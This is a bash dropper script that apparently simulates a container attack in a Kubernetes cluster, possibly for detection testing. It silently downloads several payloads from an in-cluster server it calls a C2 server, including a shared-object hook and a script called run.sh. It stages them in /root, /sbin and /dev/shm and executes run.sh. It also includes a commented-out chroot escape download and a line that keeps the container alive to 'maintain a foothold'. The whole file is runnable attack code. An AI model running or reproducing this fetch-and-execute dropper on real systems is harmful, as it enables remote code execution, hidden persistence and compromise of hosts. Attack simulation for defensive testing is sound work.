#!/bin/bash

# Create a temporary directory for malicious payloads.
# Using /tmp is a common attacker technique to blend in.
mkdir -p /tmp/payloads
cd /tmp/payloads

# Download all attack components from the C2 server.
# The -s flag is used to perform the download silently, hiding progress.
echo "Downloading payloads from C2 server..."
curl -s http://payload-server.default.svc.cluster.local:8080/xmx2 -o xmx2 || echo "Failed to download xmx2"
curl -s http://payload-server.default.svc.cluster.local:8080/cc.py -o cc.py || echo "Failed to download cc.py"
curl -s http://payload-server.default.svc.cluster.local:8080/hook.so -o hook.so || echo "Failed to download hook.so"
curl -s http://payload-server.default.svc.cluster.local:8080/run.sh -o run.sh || echo "Failed to download run.sh"
curl -s http://payload-server.default.svc.cluster.local:8080/config.json -o config.json || echo "Failed to download config.json"
curl -s http://payload-server.default.svc.cluster.local:8080/noumt -o noumt || echo "Failed to download noumt"
#curl -s http://payload-server.default.svc.cluster.local:8080/chroot_escape -o chroot_escape || echo "Failed to download chroot_escape"

# Set executable permissions on the downloaded tools.
chmod +x xmx2 cc.py run.sh noumt #chroot_escape 

# Distribute the downloaded files across the filesystem to different locations.
# This mimics an attacker staging their tools for different phases of the attack.
cp run.sh /root/run.sh
mkdir -p /sbin
cp config.json /sbin/config.json 2>/dev/null
cp hook.so /tmp/payloads/hook.so 2>/dev/null
cp noumt /dev/shm/noumt 2>/dev/null
#cp chroot_escape /tmp/chroot_escape 2>/dev/null

# Execute the main multi-stage attack script.
echo "Executing main payload: /root/run.sh..."
bash /root/run.sh || echo "Failed to execute run.sh, check logs"

# Keep the container alive after the script finishes to allow for forensic analysis
# or to maintain a foothold.
echo "Dropper script completed. Keeping container alive."
tail -f /dev/null